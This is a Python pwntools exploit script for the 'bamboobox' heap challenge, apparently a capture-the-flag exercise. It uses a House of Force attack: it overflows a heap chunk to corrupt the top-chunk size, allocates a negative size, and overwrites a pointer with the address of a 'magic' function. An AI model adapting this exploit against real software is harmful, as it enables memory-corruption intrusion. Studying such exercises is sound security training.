from pwn import*

context(arch='amd64',os='linux')
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

r = process('./bamboobox')

elf = ELF('./bamboobox')

gdb.attach(r)
exit_got = elf.got['exit']
magic = elf.symbols['magic']
goodbye_message = elf.symbols['goodbye_message']

def log_message():
    log.info('main+210(show_item)')
    log.info('main+222(add_item)')
    log.info('main+234(change_item)')
    log.info('main+246(remove_item)')
    log.info('exit_got = '+hex(exit_got))
    log.info('magic = '+hex(magic))
    log.info('goodbye_message = '+hex(goodbye_message))
    pause()

def show():
    r.sendlineafter('choice:','1')

def add_item(size,name):
    r.sendlineafter('choice:','2')
    r.sendline(str(size))
    r.sendline(str(name))

def change_item(index,length,name):
    r.sendlineafter('choice:','3')
    r.sendline(str(index))
    r.sendline(str(length))
    r.sendline(str(name))

def remove_item(index):
    r.sendlineafter('choice:','4')
    r.sendlineafter('index of item:',str(index))

def exit():
    r.sendline('5')

def main():
    log_message()
    
    #goodbye_message - top_chunk_addr - 0x10(metadata) - 0x10(prev_size, size)
    payload = ''
    payload += 'A'*40
    payload += p64(0xffffffffffffffff)
   
    add_item(32,'A'*0x10)
    change_item(0,48,payload)
    add_item(-88,'AAAA')
    add_item(16,p64(magic)*2)

    exit()
    

    r.interactive()
if __name__ == '__main__':
    main()
